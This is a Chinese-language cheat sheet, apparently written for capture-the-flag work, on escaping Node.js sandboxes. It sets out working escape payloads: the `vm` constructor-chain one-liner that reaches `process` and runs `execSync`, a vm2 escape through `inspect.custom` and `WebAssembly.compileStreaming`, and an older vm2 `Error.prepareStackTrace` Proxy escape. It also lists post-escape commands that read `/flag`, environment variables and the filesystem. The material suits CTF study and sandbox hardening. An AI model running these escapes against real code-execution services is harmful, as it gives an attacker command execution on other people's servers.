# Node.js 沙箱逃逸

凡是「在线执行 JS」的服务，先分清它用的是哪一种隔离 —— 逃逸手法完全不同。沙箱名称本身不够：同一库的版本、封装器和结果捕获路径都可能改变行为；优先读取题面/服务公开的版本线索，不要把一种引擎的尝试直接迁移到另一种。

## 0. 指纹、异常边界与输出通道

1. 先做无害指纹：题面描述、公开首页/接口信息、允许的全局对象和错误格式；把 built-in `vm`、第三方 sandbox、isolate 与子进程/权限隔离区分开。版本未知就明确记为未知，不要假设某个历史漏洞适用。
2. 单独确认结果如何回到调用者：表达式返回值、标准输出、被捕获异常还是序列化结果。用无害的固定 sentinel 验证显示路径；若输出为空，先排查 harness 的捕获方式，不要立即换逃逸链。
3. 沙箱经常会跨 realm 包装异常。错误栈生成、字符串强制转换、日志格式化及回调调用属于需要审查的信任边界；用无害错误对象观察哪一侧负责格式化和如何捕获，再依据已确认版本/实现评估风险。不要仅因普通 `Error` 输出不同就认定可逃逸。
4. 每次只验证一个边界假设；工具返回的异常/输出必须与题面说明和服务端可见行为一致，才能作为事实。若连续尝试只得到相同错误或无输出，停止该链并换成有证据支持的方向。

| 特征 | 用的什么 | 难度 |
|---|---|---|
| `vm.runInNewContext` / `vm.runInThisContext` | Node 内置 `vm`（**不是安全边界**） | 极低 |
| `vm2`（`NodeVM` / `VM`） | 第三方沙箱库 | 低（历史 CVE 多） |
| `isolated-vm` | V8 isolate | 高，基本只能逻辑漏洞 |
| 子进程 + `--experimental-permission` | 真隔离 | 看权限配置 |

先探一句：

```js
console.log(typeof process)          // undefined = 在沙箱里
console.log(this.constructor.name)   // Object / Function
```

## 1. `vm` 模块：一行就出

```js
this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()
```

`vm.runInNewContext` 只换了 global，**原型链还是主上下文的**，任何对象的 `.constructor` 都能拿到 `Function`，
`Function('return process')()` 就回到主上下文。

变体（某个被过滤时换）：

```js
this.constructor.constructor('return global')()
(()=>{}).constructor('return process')()
Object.constructor('return process')()
[].filter.constructor('return process')()
"".sub.constructor('return process')()
```

## 2. `vm2`：CVE-2023-37903（`inspect.custom` + `WebAssembly`）

vm2 ≤ 3.9.19 可用。核心是 `nodejs.util.inspect.custom` 这个 symbol：
vm2 的 `WebAssembly.compileStreaming`（以及 `import()`、部分 `util` 调用）会**直接把对象交给宿主侧的
`util.inspect`**，而 `inspect` 是我们伪造的对象上自定义的 symbol 方法 —— 于是拿到宿主的 `inspect` 函数，
它本身是个**宿主 Function**，`constructor('return process')` 就回去了：

```js
const sym = Symbol.for("nodejs.util.inspect.custom");
const o = {
  [sym]: (depth, opt, inspect) => {
    const p = inspect.constructor("return process")();
    console.log(p.mainModule.require("child_process").execSync("cat /flag").toString());
  }
};
WebAssembly.compileStreaming(o).catch(() => {});
```

其他入口同理：`import('data:text/javascript,')`、`new (require('util').promisify)`。

## 3. 更老的 `vm2`：`Error.prepareStackTrace`

```js
const e = new Error();
e.name = {
  toString: new Proxy(() => "", {
    apply(target, thiz) {
      return thiz.constructor.constructor("return process")()
        .mainModule.require("child_process").execSync("cat /flag").toString();
    }
  })
};
e.stack;   // 触发 toString
```

## 4. 沙箱里的「有用物件」

拿到 `process` 之后：

```js
process.mainModule.require('child_process').execSync('ls /').toString()
process.binding('spawn_sync')        // 有些版本禁了 require 但没禁 binding
process.env                          // flag 有时直接在环境变量里
require('fs').readdirSync('/')       // 如果 require 可用
```

## 5. 判定与坑

- 返回 `process is not defined` = **在沙箱里**，`Function('return process')()` 这条正是要绕开它
- 返回 `SyntaxError: Illegal return statement` = 代码被当成**脚本**执行，别写 `return`，直接表达式或 `console.log`
- 沙箱通常**只捕获 `console.log`**：要回显就 `console.log`，别指望 `return`
- 有超时，`execSync` 一次把所有要看的东西都打出来
- `eval` 被 ban 不影响 `Function` 构造器（它们不是一回事）
